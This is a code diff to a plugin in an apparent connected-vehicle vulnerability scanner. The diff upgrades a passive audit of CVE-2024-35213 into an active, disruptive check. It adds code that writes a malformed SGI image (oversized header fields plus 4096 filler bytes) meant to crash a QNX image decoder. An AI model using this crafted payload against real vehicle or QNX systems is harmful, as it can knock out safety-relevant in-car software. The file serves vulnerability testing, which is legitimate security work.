@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
-"""Safe CVE exposure audit PoC for connected-vehicle vulnerability intelligence."""
+"""Active validation PoC for connected-vehicle vulnerability scanning."""
 from __future__ import annotations
 
 from active_validation_core import run_active_validation
 from iv_plugin_base import IVIVulnerabilityPlugin
+from local_exp_stimulus import build_local_sample_probe, write_temp_sample
 
 
 VULN = {
@@ -70,9 +71,35 @@ VULN = {
 }
 
 
+def _write_qnx_sgi_sample() -> str:
+    payload = (
+        b"\x01\xda"
+        + b"\x00\x01"
+        + b"\x00\x01"
+        + b"\xff\xff\xff\xff"
+        + b"\xff\xff\xff\xff"
+        + b"\x00\x03"
+        + b"\x00\x01"
+        + b"QNXSGI"
+        + b"A" * 4096
+    )
+    return write_temp_sample("autosec_cve_2024_35213_", ".sgi", payload)
+
+
+def _sgi_probe(plugin, vuln):
+    return build_local_sample_probe(
+        plugin,
+        sample_param="sgi_sample_path",
+        command_params=("qnx_image_decoder_cmd", "decoder_cmd"),
+        generated_sample=_write_qnx_sgi_sample,
+        phenomenon="crafted SGI sample prepared for QNX SGI codec validation failure or crash observation",
+        operator_action="Run sample_path through the QNX SGI decoder via qnx_image_decoder_cmd/decoder_cmd and observe crash, abort, or sanitizer output.",
+    )
+
+
 class Poc19CVE202435213RCEDoSInputValidationAuditPlugin(IVIVulnerabilityPlugin):
     meta_display_id = 'XLSX-028'
-    meta_poc_name = 'CVE-2024-35213 输入校验/RCE或DoS Exposure Audit'
+    meta_poc_name = 'CVE-2024-35213 输入校验/RCE或DoS Active Validation'
     meta_cve_id = 'CVE-2024-35213'
     meta_severity = 'High'
     meta_protocol = 'local'
@@ -81,11 +108,11 @@ class Poc19CVE202435213RCEDoSInputValidationAuditPlugin(IVIVulnerabilityPlugin):
     meta_profiles = ['local_artifact']
     meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-35213'
     meta_attack_surface = '系统/供应链组件'
-    is_disruptive = False
-    meta_destructive_level = "Safe"
+    is_disruptive = True
+    meta_destructive_level = "Disruptive"
 
     def check_prerequisites(self):
         return True
 
     def exploit(self):
-        return run_active_validation(self, VULN)
+        return run_active_validation(self, VULN, probe=_sgi_probe)
